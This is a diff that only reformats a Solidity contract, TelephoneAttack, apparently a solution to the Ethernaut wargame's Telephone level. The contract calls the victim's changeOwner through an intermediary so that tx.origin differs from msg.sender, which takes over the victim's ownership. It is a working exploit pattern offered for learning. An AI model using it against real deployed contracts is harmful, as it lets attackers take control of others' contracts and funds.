@@ -12,25 +12,24 @@ passing Ethernaut's Telephone contract address to the constructor.
         await contract.owner()
 */
 
-
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.6.0;
 
-import "./Telephone.sol";
+import './Telephone.sol';
 
 contract TelephoneAttack {
-    Telephone public victimContract;
+	Telephone public victimContract;
 
-    // Get an instance of the copy of the Telephone contract we have deployed
-    constructor(address victimContractAddr) public {
-        victimContract = Telephone (victimContractAddr);
-    }
+	// Get an instance of the copy of the Telephone contract we have deployed
+	constructor(address victimContractAddr) public {
+		victimContract = Telephone(victimContractAddr);
+	}
 
-    // By calling this function, the tx.origin will be our address
-    // and the msg.sender will be this contract's address
-    // and we'll be able to pass succesfully the if statement: 
-    // if (tx.origin != msg.sender)
-    function changeOwner(address _newOwner) public {
-        victimContract.changeOwner(_newOwner);
-    }
+	// By calling this function, the tx.origin will be our address
+	// and the msg.sender will be this contract's address
+	// and we'll be able to pass succesfully the if statement:
+	// if (tx.origin != msg.sender)
+	function changeOwner(address _newOwner) public {
+		victimContract.changeOwner(_newOwner);
+	}
 }
